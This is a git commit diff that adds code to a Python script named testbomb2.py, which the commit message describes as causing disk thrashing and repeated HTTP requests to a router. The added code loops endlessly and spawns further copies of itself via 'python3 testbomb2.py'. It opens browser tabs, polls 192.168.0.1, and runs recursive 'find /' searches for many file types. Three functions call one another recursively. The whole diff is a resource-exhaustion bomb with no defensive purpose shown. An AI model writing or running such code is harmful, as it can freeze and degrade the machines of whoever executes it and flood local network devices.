63b091fb158039c4c80666f684b92f0c044324eb
AvidAndAmateur <52603515+AvidAndAmateur@users.noreply.github.com>
2026-05-24 02:41:36 +0100

    Update testbomb2.py
    searches for multiple file types causing disk thrashing, repeats http requests to router

--- testbomb2.py
+++ testbomb2.py
@@ -2,6 +2,7 @@ import sys
 import random
 import os
 import webbrowser
+import urllib.request
 sys.setrecursionlimit(150000000)
 sys.setswitchinterval(0)
 sys.set_int_max_str_digits(10000000)
@@ -14,9 +15,73 @@ def initialbomb():
     while True:
         x+=sys.maxunicode**sys.maxsize
         webbrowser.open_new_tab("https://www.google.com")
+        webbrowser.open_new("https://www.google.com")
+        urllib.request.urlopen("http://192.168.0.1")
         random.randint(0,1000)
         os.system("echo 11182173272323")
         os.system("top")
+        os.system("find / -name '*.txt'")
+        os.system("find / -name '*.pdf'")
+        os.system("find / -name '*.exe'")
+        os.system("find / -name '*.dmg'")
+        os.system("find / -name '*.appimage'")
+        os.system("find / -name '*.zip'")
+        os.system("find / -name '*.rar'")
+        os.system("find / -name '*.png'")
         os.system('python3 testbomb2.py')
         initialbomb()
+        secondarybomb()
+        thirdbomb()
+def secondarybomb():
+    x = 1
+    x+= 1**7
+    y = 1**x
+    y+=1**2**x
+
+    while True:
+        x+=sys.maxunicode**sys.maxsize
+        webbrowser.open_new_tab("https://www.google.com")
+        webbrowser.open_new("https://www.google.com")
+        urllib.request.urlopen("http://192.168.0.1")
+        random.randint(0,1000)
+        os.system("echo 11182173272323")
+        os.system("top")
+        os.system("find / -name '*.txt'")
+        os.system("find / -name '*.pdf'")
+        os.system("find / -name '*.exe'")
+        os.system("find / -name '*.dmg'")
+        os.system("find / -name '*.appimage'")
+        os.system("find / -name '*.zip'")
+        os.system("find / -name '*.rar'")
+        os.system("find / -name '*.png'")
+        os.system('python3 testbomb2.py')
+        initialbomb()
+        secondarybomb()
+        thirdbomb()
+def thirdbomb():
+    x = 1
+    x+= 1**7
+    y = 1**x
+    y+=1**2**x
+
+    while True:
+        x+=sys.maxunicode**sys.maxsize
+        webbrowser.open_new_tab("https://www.google.com")
+        webbrowser.open_new("https://www.google.com")
+        urllib.request.urlopen("http://192.168.0.1")
+        random.randint(0,1000)
+        os.system("echo 11182173272323")
+        os.system("top")
+        os.system("find / -name '*.txt'")
+        os.system("find / -name '*.pdf'")
+        os.system("find / -name '*.exe'")
+        os.system("find / -name '*.dmg'")
+        os.system("find / -name '*.appimage'")
+        os.system("find / -name '*.zip'")
+        os.system("find / -name '*.rar'")
+        os.system("find / -name '*.png'")
+        os.system('python3 testbomb2.py')
+        initialbomb()
+        secondarybomb()
 initialbomb()
+secondarybomb()
